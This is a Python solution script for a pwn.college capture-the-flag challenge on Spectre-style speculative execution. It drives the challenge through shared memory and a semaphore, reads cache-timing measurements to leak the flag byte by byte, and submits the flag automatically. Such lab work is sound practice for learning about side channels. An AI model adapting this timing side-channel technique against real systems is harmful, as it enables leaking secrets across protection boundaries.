#!/nix/store/cdaifv92znxy5ai4sawricjl0p5b9sgf-python3-3.13.11/bin/python3.13
# Microarchitecture Exploitation - Baby Spectre 1
# https://pwn.college/system-security/speculative-execution/babyarch-parseonepage

def inside_challenge() -> None:
    import ctypes
    import os
    import subprocess
    import time

    SHM = 0x1337000
    index = ctypes.c_int.from_address(SHM + 32)
    timings = (ctypes.c_uint64 * 256).from_address(SHM + 0x1000)
    sem_post = ctypes.CDLL("libc.so.6").sem_post

    flag = bytearray()
    for pos in range(64):
        index.value = pos
        sem_post(SHM)
        time.sleep(0.002)

        leaked = min(range(256), key=lambda i: timings[i])
        if not (0 < leaked < 128):
            break
        flag.append(leaked)
        print(f"[{pos:2d}] 0x{leaked:02x} '{chr(leaked)}'", flush=True)
        if leaked == ord("}"):
            break

    flag = flag.decode()
    print("FLAG:", flag)
    if "pwn.college" in flag:
        try:
            print(subprocess.check_output(["dojo", "submit", flag], text=True))
        except subprocess.CalledProcessError as e:
            print(e.output)

    # 让父进程退出
    sem_post(SHM)
    os._exit(0)


def ctf() -> None:
    import pwn
    from dojotool import find_challenge, tee

    with pwn.process([find_challenge(), __file__], raw=True, level="error") as io:
        tee(io)
        io.recvrepeat()


if __name__ == "__main__":
    import sys

    # run with `python dojo.py flag.py anything`
    if len(sys.argv) > 1:
        ctf()
    else:
        inside_challenge()

